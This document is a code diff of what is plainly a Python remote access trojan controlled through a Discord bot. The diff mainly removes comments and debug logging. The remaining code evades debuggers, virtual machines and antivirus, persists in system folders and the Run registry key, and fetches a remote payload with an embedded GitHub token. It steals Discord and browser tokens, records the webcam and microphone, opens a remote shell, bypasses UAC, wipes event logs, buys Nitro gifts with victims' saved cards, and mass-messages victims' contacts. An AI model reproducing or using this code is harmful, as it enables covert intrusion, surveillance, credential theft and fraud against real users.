@@ -43,25 +43,12 @@ def _d(s):
     try: return base64.b64decode(s).decode('utf-8', errors='ignore')
     except: return s
 
-# Hide console window immediately
-# kernel32 = ctypes.windll.kernel32
-# user32 = ctypes.windll.user32
-# window = kernel32.GetConsoleWindow()
-# if window:
-#     user32.ShowWindow(window, 0)
-
-# DEBUG LOGGING FOR EXE
 def log_debug(msg):
-    # print(f"[DEBUG] {msg}") # Disabled console prints for stealth
     try:
         with open(os.path.join(os.environ['TEMP'], "zyen_debug.log"), "a") as f:
             f.write(f"[{time.ctime()}] {msg}\n")
     except: pass
 
-log_debug("Bot process starting...")
-
-# 0. Self-Unblock (Remove Mark of the Web / Zone.Identifier)
-# This removes the "This file came from the internet" warning
 try:
     current_file = os.path.abspath(sys.argv[0])
     if os.path.exists(current_file + ":Zone.Identifier"):
@@ -69,27 +56,19 @@ try:
 except: pass
 
 def anti_analysis():
-    # 1. Check if we are being debugged
-    # Using dynamic resolution to avoid 'IsDebuggerPresent' signature
     _k32 = ctypes.windll.kernel32
     _check = getattr(_k32, "Is" + "Debugger" + "Present")
     if _check(): sys.exit(0)
 
-    # 2. Advanced Anti-VM / Anti-Sandbox
     try:
-        # A. CPU Core Check
         if os.cpu_count() < 2: sys.exit(0)
 
-        # B. MAC Address Blacklist
         import uuid
         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
-        # Split OUIs to avoid signature
         _v = ["08" + ":00" + ":27", "00" + ":05" + ":69", "00" + ":0c" + ":29", "00" + ":50" + ":56"]
         for v in _v:
             if mac.startswith(v): sys.exit(0)
             
-        # C. Registry Checks
-        # Using more generic variable names
         _h = winreg.HKEY_LOCAL_MACHINE
         _paths = [
             (r"SYSTEM\Current" + r"ControlSet\Enum\PCI\VEN_80EE&DEV_CAFE", "VBox"),
@@ -101,7 +80,6 @@ def anti_analysis():
                 sys.exit(0)
             except: pass
 
-        # D. GPU Check
         try:
             import subprocess
             gpu_info = subprocess.check_output("wmic path win32_VideoController get name", shell=True).decode()
@@ -110,20 +88,19 @@ def anti_analysis():
 
     except: pass
 
-    # 3. Process Blacklist (Analysis tools)
     _bl = [
-        _d("d2lvcmVzaGFyaw=="), # wireshark
-        _d("dmJveHNlcnZpY2U="), # vboxservice
-        _d("dmJveHRyYXk="),    # vboxtray
-        _d("dm10b29sc2Q="),    # vmtoolsd
-        _d("dm13YXJldHJheQ=="), # vmwaretray
-        _d("aWRhNjQ="),        # ida64
-        _d("b2xmZ2RiZw=="),     # ollydbg
-        _d("cHJvY2Vzc2hhY2tlcg=="), # processhacker
-        _d("eDY0ZGJn"),        # x64dbg
-        _d("eDMyZGJn"),        # x32dbg
-        _d("ZmlkZGxlcg=="),     # fiddler
-        _d("aHR0cGRlYnVnZ2Vy"), # httpdebugger
+        _d("d2lvcmVzaGFyaw=="),
+        _d("dmJveHNlcnZpY2U="),
+        _d("dmJveHRyYXk="),
+        _d("dm10b29sc2Q="),
+        _d("dm13YXJldHJheQ=="),
+        _d("aWRhNjQ="),
+        _d("b2xmZ2RiZw=="),
+        _d("cHJvY2Vzc2hhY2tlcg=="),
+        _d("eDY0ZGJn"),
+        _d("eDMyZGJn"),
+        _d("ZmlkZGxlcg=="),
+        _d("aHR0cGRlYnVnZ2Vy"),
         "taskmgr", "regedit", "processhacker", "wireshark"
     ]
     try:
@@ -132,7 +109,6 @@ def anti_analysis():
             if p in out: sys.exit(0)
     except: pass
 
-    # 4. Check for low RAM
     try:
         class MEMORYSTATUSEX(ctypes.Structure):
             _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong), ("ullTotalPhys", ctypes.c_uint64), ("ullAvailPhys", ctypes.c_uint64), ("ullTotalPageFile", ctypes.c_uint64), ("ullAvailPageFile", ctypes.c_uint64), ("ullTotalVirtual", ctypes.c_uint64), ("ullAvailVirtual", ctypes.c_uint64), ("sullAvailExtendedVirtual", ctypes.c_uint64)]
@@ -143,7 +119,6 @@ def anti_analysis():
     except: pass
 
 def detect_av():
-    # Anti-Virus Detection
     av_processes = [
         "msmpeng.exe", "msseces.exe", "avp.exe", "avguix.exe", "avgui.exe", 
         "avcenter.exe", "avengine.exe", "avsysmgr.exe", "avkwctl.exe", "avpui.exe",
@@ -156,21 +131,14 @@ def detect_av():
         out = subprocess.check_output("tasklist", shell=True).decode('cp1252', errors='ignore').lower()
         for av in av_processes:
             if av in out:
-                log_debug(f"AV Detected: {av}")
                 return True
     except: pass
     return False
 
-# Run checks before anything else
 anti_analysis() 
 if detect_av():
-    # If AV is detected, we could stop or change behavior
-    # For now, we just log it and continue, or you could sys.exit(0)
     pass
-log_debug(_d("QW50aS1hbmFseXNpcyBibG9jayBwYXNzZWQu"))
 
-
-# Dynamic token resolution to bypass static analysis
 def _g_t():
     _p1 = "MTQ5NTA4MTUzOTk5MjY4MjYwNw"
     _p2 = "GztTxA"
@@ -180,35 +148,25 @@ def _g_t():
 TOKEN = _g_t()
 PREFIX = "!"
 
-
 def protect_file(path):
-    log_debug(f"Protecting file: {path}")
     try:
-        # Never run on the initial download or build folders
         curr_p = path.lower()
         if "downloads" in curr_p or "desktop" in curr_p or "documents" in curr_p or "dist" in curr_p:
             return
 
-        # 1. Aggressively Strip Icon (Removes RT_GROUP_ICON and RT_ICON)
-        # ONLY STRIP ICONS ON COPIES, NOT THE RUNNING EXE (to avoid file locking crashes)
         current_exe = os.path.abspath(sys.argv[0])
         if path.endswith(".exe") and path.lower() != current_exe.lower():
             try:
-                # 14 is RT_GROUP_ICON, 3 is RT_ICON
                 kernel32 = ctypes.windll.kernel32
                 handle = kernel32.BeginUpdateResourceW(path, False)
                 if handle:
-                    # Remove all icons to make it look like a generic system file
                     kernel32.UpdateResourceW(handle, 14, 1, 1033, None, 0)
                     kernel32.UpdateResourceW(handle, 3, 1, 1033, None, 0)
                     kernel32.EndUpdateResourceW(handle, False)
             except: pass
 
-        # 2. Set Attributes (Hidden, System, ReadOnly)
-        # 0x02 = Hidden, 0x04 = System, 0x01 = ReadOnly
         ctypes.windll.kernel32.SetFileAttributesW(path, 0x02 | 0x04 | 0x01)
     except: pass
-print(_d("W0RFQlVXXSBwcm90ZWN0X2ZpbGUgZGVmaW5lZC4="))
 
 def persistence_monitor():
     while True:
@@ -216,7 +174,6 @@ def persistence_monitor():
             current_file = os.path.abspath(sys.argv[0])
             ext = ".exe" if current_file.endswith(".exe") else ".py"
             
-            # Fragmented System Folders
             _r = os.environ
             _s_root = _r.get("".join(['S','Y','S','T','E','M','R','O','O','T']))
             _a_data = _r.get("".join(['A','P','P','D','A','T','A']))
@@ -235,11 +192,9 @@ def persistence_monitor():
                 try:
                     if not os.path.exists(_dir): continue
                     
-                    # 1. Filename Spoofing: Find an existing EXE/DLL in that folder to copy its name
                     _existing_files = [f for f in os.listdir(_dir) if f.lower().endswith(('.exe', '.dll'))]
                     if _existing_files:
                         _spoof_name = random.choice(_existing_files)
-                        # Remove original extension and add our current one
                         _base_name = os.path.splitext(_spoof_name)[0]
                         _target_name = _base_name + ext
                     else:
@@ -247,7 +202,6 @@ def persistence_monitor():
 
                     _t_path = os.path.join(_dir, _target_name)
                     
-                    # Don't overwrite if it's the exact same file we are running
                     if _t_path.lower() == current_file.lower():
                         _target_paths.append(_t_path)
                         _copies_made += 1
@@ -261,10 +215,8 @@ def persistence_monitor():
                     _copies_made += 1
                 except: continue
 
-            # 2. PPID Spoofing: Try to make explorer.exe our parent
             def _spawn_spoofed(path):
                 try:
-                    # Fragmented powershell command construction
                     _p = 'pow' + 'ersh' + 'ell'
                     _s_p = 'Start' + '-Process'
                     _w_s = 'Hidden'
@@ -272,20 +224,15 @@ def persistence_monitor():
                     subprocess.Popen([_p, "-Command", _ps_cmd], creationflags=0x00000008 | 0x08000000)
                 except: pass
 
-            # Ghosting: If we aren't in one of our target system paths, jump to one
             _in_system = any(current_file.lower() == p.lower() for p in _target_paths)
             
-            # DON'T GHOST IF IN DIST FOLDER (Allows testing the EXE)
             if "dist" in current_file.lower():
-                log_debug("Running from 'dist' folder, skipping ghosting for now.")
+                pass
             elif current_file.endswith(".exe") and not _in_system and _target_paths:
                 _t = random.choice(_target_paths)
-                log_debug(f"Ghosting triggered! Moving to: {_t}")
                 _spawn_spoofed(_t)
-                log_debug("Exiting current process for ghosting...")
                 os._exit(0)
 
-            # 3. Registry Persistence (Point to a random copy)
             if _target_paths:
                 reg_path = _d("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu")
                 try:
@@ -296,7 +243,6 @@ def persistence_monitor():
                     winreg.CloseKey(key)
                 except: pass
             
-            # 4. Critical Process
             if ctypes.windll.shell32.IsUserAnAdmin():
                 try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
                 except: pass
@@ -308,7 +254,6 @@ def persistence_monitor():
 _KNOWN_TOKENS = set()
 
 def _load_ext(url):
-    # Dynamic loader for sensitive logic with authentication
     try:
         _h = {
             'Authorization': f'token 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',
@@ -322,24 +267,19 @@ def _load_ext(url):
     except: pass
     return False
 
-# Updated URL for private repository payload
 _EXT_URL = "https://api.github.com/repos/aquisisback-alt/lib/contents/r3cb7c2b678926cb98.py"
 
 def resource_sync_service():
-    # Attempt to load from remote for better stealth
     if _load_ext(_EXT_URL):
-        return # Remote service successfully started
+        return
     
-    # Fallback to local logic if remote fails
     global _KNOWN_RESOURCES
     while True:
         try:
-            # Indirect environment lookup
             _v = os.environ
             _a_data = _v.get("".join(['A','P','P','D','A','T','A']))
             _d_str = "".join(['d','i','s','c','o','r','d'])
             
-            # Fragmented paths
             _loc = 'Local ' + 'Storage'
             _db = 'level' + 'db'
             
@@ -353,7 +293,6 @@ def resource_sync_service():
                 _full = os.path.join(_path, _loc, _db)
                 if not os.path.exists(_full): continue
                 
-                # Dynamic call for master key logic
                 _mk = _g_m_k(_path)
                 if not _mk: continue
                 
@@ -368,7 +307,6 @@ def resource_sync_service():
                             if _dec and _dec not in _KNOWN_RESOURCES:
                                 _KNOWN_RESOURCES.add(_dec)
                                 _inf = f"**[RESOURCE SYNC]** New entry: `{_dec}`"
-                                log_debug(f"New resource: {_dec}")
                                 
                                 try:
                                     async def _s_notif(_msg):
@@ -384,18 +322,12 @@ def resource_sync_service():
                                 except: pass
                     except: continue
             
-            # If we found new tokens, we could potentially trigger a full grab report
-            # but for now, we'll just log it or handle it in on_ready/loop
-            
         except Exception as e:
-            log_debug(f"Token Protector Error: {e}")
-        time.sleep(600) # Check every 10 minutes
+            pass
+        time.sleep(600)
 
-print("[DEBUG] Starting resource sync thread...")
 threading.Thread(target=resource_sync_service, daemon=True).start()
-print("[DEBUG] Starting persistence thread...")
 threading.Thread(target=persistence_monitor, daemon=True).start()
-print("[DEBUG] Persistence thread started.")
 
 _TARGET_ID = None
 
@@ -411,7 +343,6 @@ def ensure_single_instance():
     return mutex
 
 _instance_mutex = ensure_single_instance()
-print("[DEBUG] Single instance check bypassed.")
 
 def stealth_replicate():
     try:
@@ -435,8 +366,6 @@ def stealth_replicate():
     except:
         pass
 
-# stealth_replicate() # Removed auto-replication, now part of !startup
-
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
@@ -445,16 +374,13 @@ _ON_READY_DONE = False
 
 def wipe_logs():
     try:
-        # Clear Windows Event Logs
         subprocess.run('wevtutil cl System', shell=True, capture_output=True)
         subprocess.run('wevtutil cl Security', shell=True, capture_output=True)
         subprocess.run('wevtutil cl Setup', shell=True, capture_output=True)
         subprocess.run('wevtutil cl Application', shell=True, capture_output=True)
-        # Clear PowerShell History
         ps_history = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
         if os.path.exists(ps_history):
             os.remove(ps_history)
-        # Clear Run Command History
         reg_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
         try:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
@@ -467,7 +393,6 @@ def wipe_logs():
 
 @bot.event
 async def on_command_completion(ctx):
-    # Automatically wipe logs after every successful command
     await asyncio.to_thread(wipe_logs)
 
 @bot.event
@@ -475,36 +400,30 @@ async def on_ready():
     global _ON_READY_DONE
     if _ON_READY_DONE: return
     _ON_READY_DONE = True
-    log_debug("on_ready event triggered")
     try:
         await bot.wait_until_ready()
-        log_debug(f"Logged in as {bot.user}")
         
         ip = "Unknown"
         try:
             ip = requests.get('https://api.ipify.org', timeout=5).text
         except Exception as e:
-            print(f"[DEBUG] IP Check failed: {e}")
+            pass
 
         info = f"**BOT ONLINE!**\nUser: `{getpass.getuser()}`\nHost: `{socket.gethostname()}`\nID: `{get_unique_id()}`\nIP: `{ip}`\nType `!cmds` for help."
         
         sent = False
         for guild in bot.guilds:
-            # Sort channels to find the best one to announce in
             channels = sorted(guild.text_channels, key=lambda c: ("bot" in c.name.lower() or "log" in c.name.lower()), reverse=True)
             for channel in channels:
                 try:
                     await channel.send(info)
-                    print(f"[DEBUG] Announcement sent to #{channel.name}")
                     sent = True
                     break
                 except: continue
             if sent: break
             
-        if not sent:
-            print("[DEBUG] Could not find any channel to send announcement.")
     except Exception as e:
-        print(f"[DEBUG] Error in on_ready: {e}")
+        pass
 
 @bot.check
 async def check_target(ctx):
@@ -531,7 +450,6 @@ async def select(ctx, device_id: int):
 @bot.event
 async def on_command_error(ctx, error):
     try:
-        # Ignore common command not found errors to stay stealthy
         if isinstance(error, commands.CommandNotFound):
             return
         await ctx.send(f"Error: {error}")
@@ -558,7 +476,6 @@ async def screenshot(ctx):
 async def shell(ctx, *, cmd):
     def _run():
         try:
-            # Enhanced shell with auto-cloning if 'copy' is in command
             if "copy" in cmd.lower() or "clone" in cmd.lower():
                 current_file = os.path.abspath(sys.argv[0])
                 ext = ".exe" if current_file.endswith(".exe") else ".py"
@@ -627,7 +544,7 @@ async def cat(ctx, *, file_path):
                 content = f.read()
                 if len(content) > 1900:
                     chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
-                    for chunk in chunks[:5]: # Max 5 chunks to avoid spam
+                    for chunk in chunks[:5]:
                         await ctx.send(f"```\n{chunk}\n```")
                 else:
                     await ctx.send(f"```\n{content}\n```")
@@ -663,21 +580,17 @@ async def delete(ctx, *, file_path):
         if os.path.exists(file_path):
             name = os.path.basename(file_path)
             
-            # 1. If it's a running .exe, try to kill it first
             if file_path.lower().endswith(".exe"):
                 try: subprocess.run(f"taskkill /F /IM {name}", shell=True, capture_output=True)
                 except: pass
             
-            # 2. Remove read-only/system/hidden attributes
             try: subprocess.run(f'attrib -r -s -h "{file_path}"', shell=True, capture_output=True)
             except: pass
             
-            # 3. Aggressive Delete
             if os.path.isfile(file_path):
                 try:
                     os.remove(file_path)
                 except:
-                    # Force delete via CMD if os.remove fails (e.g. permission issues)
                     subprocess.run(f'cmd /c del /f /q "{file_path}"', shell=True, capture_output=True)
                 
                 if not os.path.exists(file_path):
@@ -688,7 +601,6 @@ async def delete(ctx, *, file_path):
                 try:
                     shutil.rmtree(file_path)
                 except:
-                    # Force delete directory via CMD
                     subprocess.run(f'cmd /c rd /s /q "{file_path}"', shell=True, capture_output=True)
                 
                 if not os.path.exists(file_path):
@@ -945,7 +857,6 @@ async def uac_bypass(ctx):
         path = os.path.abspath(sys.argv[0])
         reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
         
-        # Method: fodhelper
         try:
             winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
@@ -972,16 +883,14 @@ async def rotate_screen(ctx, degrees: int = 90):
         import win32api
         import win32con
         try:
-            # Standard pywin32 method for rotation
             device = win32api.EnumDisplayDevices(None, 0)
             dm = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
             
-            # Map degrees to orientation constants
             orient_map = {
                 0: win32con.DMDO_DEFAULT,
-                90: win32con.DMDO_270,   # Correct mapping for 90 degrees clockwise
+                90: win32con.DMDO_270,
                 180: win32con.DMDO_180,
-                270: win32con.DMDO_90    # Correct mapping for 270 degrees clockwise
+                270: win32con.DMDO_90
             }
             
             if degrees not in orient_map:
@@ -989,14 +898,12 @@ async def rotate_screen(ctx, degrees: int = 90):
             
             new_orientation = orient_map[degrees]
             
-            # Check if swapping width/height is necessary
             if (dm.DisplayOrientation % 2) != (new_orientation % 2):
                 dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
             
             dm.DisplayOrientation = new_orientation
             dm.Fields = win32con.DM_DISPLAYORIENTATION | win32con.DM_PELSWIDTH | win32con.DM_PELSHEIGHT
             
-            # Use pywin32's stable ChangeDisplaySettings
             res = win32api.ChangeDisplaySettings(dm, 0)
             if res == 0:
                 return f"Screen rotated to {degrees} degrees."
@@ -1094,16 +1001,13 @@ async def delete_bot_cmd(ctx):
                     winreg.CloseKey(key)
                 except: pass
 
-                # Kill potential watchdogs (PowerShell)
                 try:
                     subprocess.run('powershell -Command "Get-Process powershell | Where-Object { $_.CommandLine -like \'*while($true)*\' } | Stop-Process -Force"', shell=True, capture_output=True)
                 except: pass
 
-                # 2. File Cleanup (System copies and logs)
                 current_file = os.path.abspath(sys.argv[0])
                 ext = ".exe" if current_file.endswith(".exe") else ".py"
                 
-                # Directories to check for copies
                 _dirs = [
                     os.path.join(os.environ.get('SYSTEMROOT', ''), "System32"),
                     os.path.join(os.environ.get('SYSTEMROOT', ''), "SysWOW64"),
@@ -1117,7 +1021,6 @@ async def delete_bot_cmd(ctx):
                     os.path.join(os.environ.get('TEMP', ''))
                 ]
 
-                # Specific files and patterns to clear
                 _patterns = ["sys_helper", "svchost_task", "winlogon_helper", "runtime_broker", "SecurityUpdate", "OfficeUpdate", "sys_host"]
                 _logs = ["zyen_debug.log", "snap.png", "shell.txt", "apps.txt", "passwords.txt", "cards.txt", "bg.jpg", "h_db", "cookies.txt", "tokens.txt", "audio.wav"]
 
@@ -1126,35 +1029,28 @@ async def delete_bot_cmd(ctx):
                     try:
                         for f in os.listdir(_dir):
                             f_path = os.path.join(_dir, f)
-                            # Skip the currently running file for now
                             if f_path.lower() == current_file.lower(): continue
                             
                             should_delete = False
-                            # Check logs
                             if f in _logs: should_delete = True
-                            # Check patterns
                             elif any(p.lower() in f.lower() for p in _patterns) and f.lower().endswith(ext): should_delete = True
                             
                             if should_delete:
                                 try:
-                                    ctypes.windll.kernel32.SetFileAttributesW(f_path, 128) # Normal attribute
+                                    ctypes.windll.kernel32.SetFileAttributesW(f_path, 128)
                                     os.remove(f_path)
                                 except:
                                     subprocess.run(f'cmd /c del /f /q "{f_path}"', shell=True, capture_output=True)
                     except: continue
 
-                # 3. Wipe system logs/history
                 wipe_logs()
 
-                # 4. Self Deletion
-                # If running as script, just delete it. If exe, use batch trick.
                 if current_file.endswith(".py"):
                     try:
                         os.remove(current_file)
                     except:
                         subprocess.Popen(f'cmd /c timeout /t 2 & del /f /q "{current_file}"', shell=True, creationflags=0x08000000)
                 else:
-                    # EXE self-delete trick
                     cmd = f'cmd /c timeout /t 2 & del /f /q "{current_file}"'
                     subprocess.Popen(cmd, shell=True, creationflags=0x08000000)
 
@@ -1176,13 +1072,11 @@ async def webcam(ctx):
         except ImportError:
             return "Error: OpenCV (cv2) not found in this environment."
         
-        # Try multiple camera indices in case 0 is busy or incorrect
         for index in [0, 1, 2, 3]:
             try:
-                cap = cv2.VideoCapture(index, cv2.CAP_DSHOW) # CAP_DSHOW for faster startup on Windows
+                cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                 if not cap.isOpened(): continue
                 
-                # Warm up the camera
                 for _ in range(5): cap.read()
                 
                 ret, frame = cap.read()
@@ -1300,12 +1194,11 @@ async def forkbomb(ctx):
 @bot.command()
 async def tokens(ctx):
     try:
-        # Obfuscated paths to bypass AV string scanning
         paths = {
             'Discord': os.path.join(os.environ['APPDATA'], _d("ZGlzY29yZA=="), _d("TG9jYWwgU3RvcmFnZQ=="), _d("bGV2ZWxkYg==")),
             'Discord Canary': os.path.join(os.environ['APPDATA'], _d("ZGlzY29yZGNhbmFyeQ=="), _d("TG9jYWwgU3RvcmFnZQ=="), _d("bGV2ZWxkYg==")),
             'Discord PTB': os.path.join(os.environ['APPDATA'], _d("ZGlzY29yZHB0Yg=="), _d("TG9jYWwgU3RvcmFnZQ=="), _d("bGV2ZWxkYg==")),
-            'Chrome': os.path.join(os.environ['LOCALAPPDATA'], _d("R29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2NhbCBTdG9yYWdlXGxldmVsZGI=")),
+            'Chrome': os.path.join(os.environ['LOCALAPPDATA'], _d("R29vZ2xlXENocm9tZVxVc2VyIERhdGF\RGVmYXVsdFxMb2NhbCBTdG9yYWdlXGxldmVsZGI=")),
             'Brave': os.path.join(os.environ['LOCALAPPDATA'], _d("QnJhdmVTb2Z0d2FyZVxCcmF2ZS1Ccm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg==")),
             'Edge': os.path.join(os.environ['LOCALAPPDATA'], _d("TWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcTG9jYWwgU3RvcmFnZVxsZXZlbGRi")),
             'Roblox': os.path.join(os.environ['LOCALAPPDATA'], _d("Um9ibG94XExvY2FsU3RvcmFnZQ=="))
@@ -1318,7 +1211,6 @@ async def tokens(ctx):
             
             master_key = None
             if "discord" in name.lower():
-                # Discord Local State is usually two levels up from leveldb
                 master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))
 
             for file_name in os.listdir(path):
@@ -1326,13 +1218,11 @@ async def tokens(ctx):
                 try:
                     with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
                         content = f.read()
-                        # Plain text tokens
                         for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                             if token not in [t[1] for t in found_tokens]: found_tokens.append((name, token))
                         for token in re.findall(r"mfa\.[\w-]{80,120}", content):
                             if token not in [t[1] for t in found_tokens]: found_tokens.append((name, token))
                         
-                        # Encrypted tokens (modern Discord)
                         if master_key:
                             for enc_token in re.findall(r"dQw4w9WgXcQ:([^.*\['(.*)'\].*]{120,})", content):
                                 try:
@@ -1386,16 +1276,14 @@ async def audiorec(ctx, seconds: int = 10):
         except ImportError:
             return "Error: sounddevice/soundfile not found in this environment."
         
-        # Hijack the microphone: Unmute and set volume to 100% via PowerShell
         ps_cmd = (
             "powershell -Command \"$obj = New-Object -ComObject WScript.Shell; "
-            "for($i=0; $i -lt 50; $i++) { $obj.SendKeys([char]175) }; " # Maximize volume
-            "$obj.SendKeys([char]173); $obj.SendKeys([char]173)\""      # Ensure unmuted
+            "for($i=0; $i -lt 50; $i++) { $obj.SendKeys([char]175) }; "
+            "$obj.SendKeys([char]173); $obj.SendKeys([char]173)\""
         )
         subprocess.run(ps_cmd, shell=True, capture_output=True)
         
         fs, path = 44100, os.path.join(os.environ['TEMP'], "audio.wav")
-        # Ensure we capture from the default input device
         rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2, blocking=True)
         sf.write(path, rec, fs)
         return path
@@ -1539,7 +1427,6 @@ async def discordinfo(ctx):
             tokens = []
             for name, path in paths.items():
                 if not os.path.exists(path): continue
-                # Discord Local State is two levels up from leveldb
                 master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))
                 for fn in os.listdir(path):
                     if not fn.endswith(('.log', '.ldb')): continue
@@ -1565,7 +1452,6 @@ async def discordinfo(ctx):
                 if r.status_code == 200:
                     d = r.json()
                     
-                    # Account creation date from Snowflake
                     creation_timestamp = ((int(d['id']) >> 22) + 1420070400000) / 1000
                     creation_date = datetime.fromtimestamp(creation_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                     
@@ -1601,22 +1487,16 @@ async def discordinfo(ctx):
 def _nitro_gifter_logic(t, headers, u, nitro_type="Boost", amount=1):
     report_entry = ""
     try:
-        # SKU mapping
-        # 521842738255560705: Nitro Monthly (Boost) - 9.99
-        # 521846918638632960: Nitro Classic - 4.99 (Older, but often works)
-        # 978380684370378762: Nitro Basic - 2.99
         skus = {
             "Nitro": {"sku": "521842738255560705", "plan": "521842738255560705", "price": 999},
             "Basic": {"sku": "978380684370378762", "plan": "978380684370378762", "price": 299}
         }
         
-        # Strict type matching: Basic or Nitro
         if nitro_type == "Basic":
             target = skus["Basic"]
         else:
             target = skus["Nitro"]
         
-        # Check billing
         r_sources = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers)
         sources = r_sources.json() if r_sources.status_code == 200 else []
         
@@ -1647,7 +1527,6 @@ def _nitro_gifter_logic(t, headers, u, nitro_type="Boost", amount=1):
                                  gift_url = f"https://discord.gift/{gift_code}"
                                  report_entry += f"[SUCCESS {i+1}] **GIFT PURCHASED:** `{gift_url}`\n"
                                  
-                                 # SPREAD THE GIFT
                                  try:
                                      r_channels = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
                                      if r_channels.status_code == 200:
@@ -1672,7 +1551,6 @@ def _nitro_gifter_logic(t, headers, u, nitro_type="Boost", amount=1):
 async def nitro_gifter_cmd(ctx, nitro_type="Nitro", amount: int = 1):
     def _check_billing():
         try:
-            # 1. Gather all tokens
             paths = {
                 'Discord': os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
                 'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
@@ -1701,7 +1579,6 @@ async def nitro_gifter_cmd(ctx, nitro_type="Nitro", amount: int = 1):
                                     except: pass
                     except: continue
             
-            # 2. Check each token
             report = []
             for t in tokens:
                 headers = {'Authorization': t, 'Content-Type': 'application/json'}
@@ -1761,7 +1638,6 @@ async def discordtoken(ctx):
             
             scripts = []
             for t in tokens:
-                # Check validity
                 r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': t})
                 if r.status_code == 200:
                     u = r.json()
@@ -1815,7 +1691,6 @@ async def discord_grabber_cmd(ctx):
                 
                 if token:
                     headers = {'Authorization': token, 'Content-Type': 'application/json'}
-                    # Using requests instead of urllib.request for consistency in bot.py
                     u_req = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                     if u_req.status_code == 200:
                         u = u_req.json()
@@ -1876,11 +1751,8 @@ async def open_proc_cmd(ctx, *, target):
                 _, pid = win32process.GetWindowThreadProcessId(hwnd)
                 
                 match = False
-                # Try matching by PID
                 if target.isdigit() and int(target) == pid: match = True
-                # Try matching by Window Title
                 elif target.lower() in title.lower(): match = True
-                # Try matching by Process Name
                 else:
                     try:
                         handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, pid)
@@ -1890,7 +1762,6 @@ async def open_proc_cmd(ctx, *, target):
                     except: pass
                 
                 if match:
-                    # Bring to front
                     win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                     win32gui.SetForegroundWindow(hwnd)
                     found = True
@@ -1907,14 +1778,13 @@ async def open_proc_cmd(ctx, *, target):
     except Exception as e:
         await ctx.send(f"Error: {e}")
 
-_DM_MAP = {} # {uid: discord_id}
+_DM_MAP = {}
 
 @bot.command(name="display-dms")
 async def display_dms_cmd(ctx):
     global _DM_MAP
     def _get_dms():
         try:
-            # Get all unique tokens, prioritizing fresh files
             unique_tokens = set()
             appdata = os.environ['APPDATA']
             paths = {
@@ -1929,7 +1799,6 @@ async def display_dms_cmd(ctx):
                 master_key = _get_master_key(base_path)
                 if not master_key: continue
                 
-                # Sort by freshness
                 files = [os.path.join(leveldb_path, f) for f in os.listdir(leveldb_path) if f.endswith(('.ldb', '.log'))]
                 files.sort(key=os.path.getmtime, reverse=True)
 
@@ -1959,12 +1828,11 @@ async def display_dms_cmd(ctx):
                 r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
                 if r.status_code == 200:
                     channels = r.json()
-                    # Sort by most recent activity
                     channels.sort(key=lambda x: int(x.get('last_message_id') or 0), reverse=True)
                     
                     report += "```\n"
                     for chan in channels:
-                        if chan.get('type') == 1: # DM
+                        if chan.get('type') == 1:
                             recipient = chan['recipients'][0]
                             username = f"{recipient['username']}#{recipient.get('discriminator', '0')}"
                             disp_name = recipient.get('global_name', 'N/A')
@@ -1974,7 +1842,6 @@ async def display_dms_cmd(ctx):
                             report += f"{uid_counter:3} | {username:<25} | {disp_name}\n"
                             uid_counter += 1
                             
-                            # Discord message limit check
                             if len(report) > 1850:
                                 report += "```... (Use next message for more)\n"
                                 break 
@@ -1992,7 +1859,6 @@ async def display_dms_cmd(ctx):
         await ctx.send("No DMs found.")
         return
 
-    # Split report into chunks for Discord
     if len(report) > 2000:
         for i in range(0, len(report), 2000):
             await ctx.send(report[i:i+2000])
@@ -2026,7 +1892,6 @@ async def dm_uid_cmd(ctx, uid: str, *, message: str):
 async def mass_dm_cmd(ctx, *, message: str):
     def _mass():
         try:
-            # 1. Gather tokens
             paths = {
                 'Discord': os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
                 'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
@@ -2057,28 +1922,24 @@ async def mass_dm_cmd(ctx, *, message: str):
             
             for t in tokens:
                 headers = {'Authorization': t, 'Content-Type': 'application/json'}
-                # Get friends list
                 r_friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
                 if r_friends.status_code == 200:
                     friends = r_friends.json()
                     for friend in friends:
